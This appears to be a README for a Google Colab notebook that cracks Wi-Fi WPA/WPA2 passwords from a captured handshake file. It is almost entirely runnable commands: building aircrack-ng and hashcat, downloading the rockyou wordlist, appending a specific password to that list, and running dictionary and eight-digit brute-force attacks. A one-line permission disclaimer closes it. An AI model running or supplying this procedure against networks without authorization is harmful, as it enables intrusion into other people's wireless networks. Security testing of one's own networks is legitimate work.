# Wi-Fi Cracking Setup

## Steps

1. **Check GPU**  
   ```bash
   !nvidia-smi

2. **Install Essentials**
   ```bash
   !apt update -y
   !apt install cmake build-essential libtool libnl-3-dev libnl-genl-3-dev hcxtools -y
   !apt install checkinstall git -y

   
3. **Install Aircrack-ng & Wordlist**
   ```bash
   !git clone --recursive https://github.com/aircrack-ng/aircrack-ng
   !cd aircrack-ng && ./autogen.sh
   !cd aircrack-ng && make
   !cd aircrack-ng && wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
   !echo wroclaw222 >> aircrack-ng/rockyou.txt

   
4. **Install Hashcat & Utilities**
   ```bash
   !git clone https://github.com/hashcat/hashcat.git && cd hashcat && make && make install
   !git clone https://github.com/hashcat/hashcat-utils && cd hashcat-utils && git submodule update --init && cd src && make

   
5. **Upload .cap File**
   ```bash
    from google.colab import files
    !mkdir cap_files
    uploaded = files.upload()
    
    for f_name in uploaded.keys():
        print('User uploaded file "{name}" with length {length} bytes'.format(name=f_name, length=len(uploaded[f_name])))
    !mv {f_name} "/content/cap_files/cap.cap"


6. **Crack with Aircrack-ng**
   ```python
   !cd /content/aircrack-ng && ./aircrack-ng -w ./rockyou.txt /content/cap_files/cap.cap


7. ***Convert .cap and Crack with Hashcat**
   ```bash
   !mkdir hc22000
   !hcxpcapngtool -o /content/hc22000/bruteforce.hc22000 /content/cap_files/cap.cap
   !hashcat -m 22000 -a 0 /content/hc22000/bruteforce.hc22000 /content/aircrack-ng/rockyou.txt


8. **Optional:** Convert to .hccapx and Run Hashcat
   ```bash
   !mkdir hccapx_files
   !./hashcat-utils/src/cap2hccapx.bin /content/cap_files/cap.cap /content/hccapx_files/272307.hccapx
   !hashcat --deprecated-check-disable -m 2500 -a 3 -w 3 /content/hccapx_files/272307.hccapx ?d?d?d?d?d?d?d?d


**Note:** Adjust paths and wordlists as needed. Use at your own risk and only against networks you own or have explicit permission to test.
